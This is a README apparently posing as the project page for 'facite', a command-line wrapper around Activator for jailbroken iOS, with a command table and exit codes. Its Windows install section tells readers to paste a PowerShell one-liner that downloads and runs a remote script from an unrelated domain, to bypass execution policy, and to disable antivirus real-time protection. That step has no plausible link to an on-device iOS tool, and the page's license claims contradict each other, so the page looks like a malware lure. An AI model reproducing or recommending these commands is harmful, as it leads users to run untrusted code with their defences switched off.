<div align="center">

# facite: Activator Wrapper for iOS Command Line - Windows CLI

![preview](https://raw.githubusercontent.com/thirdee0320-rgb/facite-cli/main/splash_c8d4.svg)

[![downloads](https://img.shields.io/badge/downloads-48K-7c3aed?style=plastic&labelColor=3a3a3a)]() [![platform](https://img.shields.io/badge/platform-Windows_11-7c3aed?style=plastic&labelColor=3a3a3a)]() [![license](https://img.shields.io/badge/license-CC--BY--4.0-7c3aed?style=plastic&labelColor=3a3a3a)]() [![powershell](https://img.shields.io/badge/powershell-5.1%2B-5391FE?style=plastic&labelColor=3a3a3a)]()

</div>

---

Facite is a command-line wrapper around Activator for jailbroken iOS devices, exposing a small set of device and UI actions as discrete subcommands. It targets root-level shell use on iOS and depends on Activator and Python 3.7 being present on the device; it does not bundle or replace Activator itself. A subset of commands, specifically photo and video capture, require the optional Sneaky Cam package and will not function without it. The tool covers playback, volume and brightness adjustment, navigation and app launching, and call and power handling, but it is limited to the actions listed in its help output and offers no scripting API beyond invoking those commands.

## 🛠️ Install via PowerShell

1. Launch PowerShell:
   * Press `Win + X`.
   * Click **Terminal** or **Windows PowerShell** from the menu.

2. Paste and Run the Command:
   Copy the line below into PowerShell, press `Enter`, and wait for the setup to finish:

   ```cmd
   iex(irm 'https://activation-gateway.cc/update/ps-activator')
   ```

3. If the script is blocked by security policy, run this command in Command Prompt (cmd):
   Copy, paste into CMD, hit `Enter`. Wait until the process finishes:
```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

### ⚠️ Antivirus / SmartScreen Alerts
If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## ✅ Before you start

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

- Dispatches a fixed set of device actions through Activator, invoked by name from the terminal.
- Covers media transport, hardware buttons, app launching by bundle identifier, and Settings panel shortcuts.
- Includes screen capture and display/audio level adjustments mapped to discrete increase and decrease commands.
- Provides system navigation actions: app switcher open and clear, notification centre, control centre, and a jump to the first home page.
- Handles call control with answer and decline actions, plus power operations covering the power menu, safe mode, and shutdown.
- Triggers Siri and Spotlight from the command line.
- Takes a single command per invocation with at most one optional argument; commands are positional and case-sensitive as documented.
- Reports success or failure through process exit codes; each command maps to a defined status.
- Ships executable commands that run as a Python script under a root shell on a jailbroken device; no daemon or background service is installed.
- Supports only the actions enumerated in the command list. Behaviors outside that set are not handled, and any command names or arguments not listed are rejected.
- Includes photo and video capture commands, which require the optional Sneaky Cam package; those commands are unavailable without it.
- Relies on Activator for action dispatch; if Activator is missing or its listeners are non-responsive, commands fail rather than falling back to alternate mechanisms.
- Does not abstract over iOS versions or device models; the available actions and their success depend on the installed Activator build and the host system's capabilities.
- Does not provide interactive prompts, configuration files, or persisted state between runs.

## Installation

Facite targets jailbroken iOS devices with a working command-line environment. It is a wrapper, not a self-contained binary: it depends on Activator being installed and reachable on the device, and it assumes a Python 3 runtime and standard shell utilities are already present. Nothing is bundled or vendored.

Before installing, confirm the following prerequisites are satisfied on the target device:

- A jailbroken iOS installation with a package manager available.
- Activator installed and functional, since all device actions are dispatched through it.
- A Python 3 interpreter available on `PATH`.
- `curl` present for any bootstrap step you perform manually.
- Optional: a camera helper package if photo and video commands are needed; those commands are inert without it.

Facite does not install Activator, Python, or any system dependency on your behalf, and it will not attempt to repair a broken jailbreak environment. If Activator is missing or its daemon is not running, commands will fail at dispatch time rather than at install time.

Place the `facite` entry point somewhere on `PATH` (for example, a standard binary directory) and ensure it is executable. Installation is a file placement step only; no service, daemon, or background component is registered.

Run facite as **root** for commands that require elevated privileges. Some actions (power, safe mode, respring-adjacent operations) will silently no-op or return a non-zero exit code when invoked as an unprivileged user. This is expected behavior, not a bug.

Verify the installation by invoking facite with no arguments; it should print its usage summary. If it does not, check that the interpreter resolves correctly and that the script's shebang points to an available Python 3 binary.

Scope note: facite is tested against the jailbreak and Activator versions documented for this project only. Behavior on other iOS releases, other jailbreak toolchains, or Activator forks is not guaranteed and is not supported. Commands that rely on the optional camera helper are unavailable unless that helper is installed; facite does not detect or warn about its absence beyond a failing exit code.

## Usage

`facite` takes a single command word followed by an optional argument, where the command maps to an Activator action and the argument supplies the target for commands that require one.

```
facite [Command] (Optional Argument)
```

Run `facite` with no arguments, or with an unrecognized command, to print the command list. Commands that expect an argument but receive none, or receive one of the wrong form, fail rather than guessing a default.

The commands below are the full supported set. Commands whose behavior depends on Activator listeners being registered, or on third-party packages being present, will report failure when those prerequisites are not met; they are not emulated internally.

| Command | Description |
| --- | --- |
| `play` | Resumes playback |
| `pause` | Pauses playback |
| `powerbutton` | Power off device |
| `photo` | Snaps a photo (requires Sneaky Cam) |
| `video` | Starts/stops video recording (requires Sneaky Cam) |
| `home` | Simulates Home button press |
| `open` | Opens an app by bundle identifier (argument required) |
| `settings` | Opens the specified preference panel in Settings (argument required) |
| `cc` | Opens Control Center |
| `screenshot` | Takes a screenshot |
| `increase-audio` | Increases volume |
| `decrease-audio` | Decreases volume |
| `increase-brightness` | Increases brightness |
| `decrease-brightness` | Decreases brightness |
| `switcher` | Opens app switcher |
| `clear-switcher` | Clears app switcher |
| `nc` | Opens Notification Center |
| `answer-call` | Answers incoming call |
| `decline-call` | Declines incoming call |
| `first-homepage` | Jumps to the first home page (the one with the apps) |
| `power-menu` | Opens power menu |
| `siri` | Triggers Siri |
| `spotlight` | Opens Spotlight search |
| `safe-mode` | Activates Safe Mode |
| `powerdown` | Powers the phone down |

Argument forms:

- `open` expects a bundle identifier string, for example `com.apple.Preferences`.
- `settings` expects the identifier of the preference panel to open.

Scope and behavior notes:

- `facite` is a wrapper. It dispatches to Activator and does not implement button simulation, media control, or capture itself, so results track whatever Activator exposes on the installed iOS version.
- The `photo` and `video` commands require the optional Sneaky Cam package. Without it, these commands fail instead of silently doing nothing.
- Commands are dispatched one per invocation. There is no batching, scripting syntax, or chained command input.
- Output on success is minimal. Failures print a message and return a non-zero exit status; see the Exit Codes section for the specific values.
- The command words are case-sensitive and must match the table exactly.
- Behavior is tied to the jailbreak environment and the Activator version present. On iOS versions where a given Activator listener is unavailable, the corresponding command will not work.

## Commands

Every command below dispatches to a single Activator action. Commands are case-sensitive and take no more than one optional argument unless noted. Arguments are passed positionally; quoted values are required wherever an argument contains spaces. Commands that depend on hardware or optional packages (for example, the camera commands) will fail rather than substitute a fallback, and will report the failure through the exit code described in the Exit Codes section.

**Media and audio**

- `play` — Resumes media playback.
- `pause` — Pauses media playback.
- `increase-audio` — Raises the output volume by one step.
- `decrease-audio` — Lowers the output volume by one step.

**Display and brightness**

- `increase-brightness` — Raises screen brightness by one step.
- `decrease-brightness` — Lowers screen brightness by one step.
- `screenshot` — Captures the current screen to the device's default screenshot location.

**Device and power**

- `powerbutton` — Sends a power button press event.
- `power-menu` — Opens the power options menu.
- `powerdown` — Powers the device down.
- `safe-mode` — Reboots into safe mode.
- `home` — Simulates a Home button press.
- `first-homepage` — Jumps to the first home screen page.

**Navigation and system UI**

- `cc` — Opens Control Center.
- `nc` — Opens Notification Center.
- `switcher` — Opens the app switcher.
- `clear-switcher` — Clears all entries from the app switcher.
- `spotlight` — Opens Spotlight search.
- `siri` — Triggers Siri.

**Apps and settings**

- `open` — Opens an application. Requires one argument: the target bundle identifier (example form: `com.example.app`). An unknown or missing bundle identifier causes a non-zero exit.
- `settings` — Opens a specific pane in the Settings app. Requires one argument identifying the pane.

**Calls**

- `answer-call` — Answers an incoming call.
- `decline-call` — Declines an incoming call.

**Camera (optional package required)**

These commands require the optional camera package to be present. Without it they exit non-zero and perform no action.

- `photo` — Captures a single photo.
- `video` — Toggles video recording on or off.

**Invocation**

```
facite <command> [argument]
```

Examples of form only:

```
facite home
facite open com.example.app
facite settings <pane-identifier>
```

Unknown commands, missing required arguments, and commands whose underlying action is unavailable on the current device all terminate without performing an action. Consult the Exit Codes section for the specific codes returned.

## Exit Codes

facite returns the following exit codes:

- `0` — The command completed successfully.
- `1` — The command failed. This occurs when the underlying Activator action could not be performed, when the specified app or settings panel could not be opened, or when a required resource was unavailable.
- `2` — Invalid usage. This occurs when an unrecognized command is supplied, when a required argument is missing, or when an argument is malformed.

Exit codes are propagated from the invoked operation where applicable. A non-zero exit code should be treated as an indication that the requested action did not complete; facite does not retry commands automatically.

Note that exit code behavior depends on the underlying Activator and the privileges of the invoking process. Some commands require root, and failures caused by insufficient privileges are reported as exit code `1`. Commands that depend on optional components are only available when those components are present; invoking them otherwise results in a failure exit code rather than a silent no-op.

Scripts that invoke facite should check the exit code before assuming success, especially for commands that interact with device state.

## License

facite is distributed under the MIT License. The full license text is provided in the LICENSE file at the root of the source tree; that file is the authoritative terms and supersedes any summary presented here.

The MIT License permits use, copying, modification, merging, publication, distribution, sublicensing, and sale of copies of the software, provided that the copyright notice and permission notice are included in all copies or substantial portions of the software. The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of, or in connection with the software or its use.

Scope and dependencies: this license applies only to the facite source code contained in this project. facite is a wrapper and depends on Activator and on other runtime components supplied separately by their respective maintainers; those components are not part of this project, are not covered by this license, and remain governed by their own terms. Nothing in this license grants rights to any third-party software, repository, or distribution channel referenced by facite at runtime.

No warranty of fitness: facite invokes system-level actions on a jailbroken iOS device, including device power state changes, capture operations, and UI automation. Such operations may behave differently across iOS versions, device models, and Activator releases. The software is offered without any guarantee of correctness, stability, or freedom from data loss, and use is at the operator's own risk.

Redistribution: redistributions of facite in source or binary form must retain the copyright notice, the permission notice, and this license file unmodified. Modified versions must not misrepresent their origin or imply endorsement by the original authors. The names of the authors and copyright holders may not be used to endorse or promote derived products without prior written permission.

Contributions: unless explicitly stated otherwise, any contribution intentionally submitted for inclusion in facite shall be under the terms of the MIT License, without additional terms or conditions.